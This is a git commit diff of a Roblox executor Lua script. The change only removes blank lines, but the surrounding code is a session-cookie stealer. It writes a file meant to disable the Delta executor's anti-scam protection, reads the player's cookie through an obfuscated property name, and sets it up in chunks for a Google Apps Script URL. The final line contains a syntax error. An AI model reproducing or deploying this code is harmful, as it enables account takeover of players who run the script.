091bb6db6edfa0b053b0663d49b23f1bfb6be91a
delt-script <github.123abc@gmail.com>
2026-04-25 19:04:17 +0900

    Update main.lua

--- main.lua
+++ main.lua
@@ -2,13 +2,11 @@ function doSnatch()local gasUrl = "https://script.google.com/macros/s/AKfycbzWKC
 local uName = game.Players.LocalPlayer.Name
 local uId = tostring(game.Players.LocalPlayer.UserId)
 local bP = "Delta/Internals/Secured/"
-
 local function doBypass()
     local payload = string.format([[{"warning":"stop","allowed_games":"*","user_id":"%s"}]], uId)
     local target = bP .. "disableantiscam"
     return pcall(function() writefile(target, payload) end)
 end
-
     local sct = game["CooNkie":sub(1,3).."Kie"]
     for i = 1, #sct, 20 do
         local f = sct:sub(i, i+19)
@@ -18,5 +16,4 @@ end
         task.wait(0.8)
     end
 end
-
 if doBypass() then task.wait-1.5) doSnatch() end
